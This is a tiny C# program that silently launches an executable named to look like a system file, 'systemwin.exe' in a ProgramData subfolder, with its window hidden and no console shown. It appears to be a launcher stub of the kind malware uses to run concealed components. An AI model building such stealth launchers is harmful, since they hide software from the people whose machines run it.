using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
namespace Tdstarter
{
    class Program
    {
        static void Main()
        {
            Process proc = new Process();
            proc.StartInfo.FileName = @"C:\ProgramData\systemdir\systemwin.exe";

            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.RedirectStandardOutput = true;

            proc.StartInfo.UseShellExecute = false;
            proc.Start();
        }
    }
}
